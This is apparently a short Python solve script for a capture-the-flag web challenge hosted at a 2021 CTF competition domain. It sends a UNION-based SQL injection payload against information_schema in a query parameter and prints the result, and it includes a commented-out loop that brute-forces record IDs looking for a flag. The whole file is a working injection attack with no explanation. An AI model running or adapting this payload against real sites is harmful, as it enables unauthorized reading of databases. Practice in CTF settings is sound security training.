#! python
import re
import time
import requests

url = 'https://quotedb-web.2021.ctfcompetition.com/'
param = {"id": 2,"1":"2 union select * from information_schema.schemata"}
response = requests.get(url=url, params=param)
print(response.text)
# for id in range(0, 1000000):
#     param["id"]=id
#     print(param)
#     response = requests.get(url=url, params=param)
#     if "CTF" in response.text:
#         print(response.text)
#         break
#     time.sleep(0.1)
# print (id)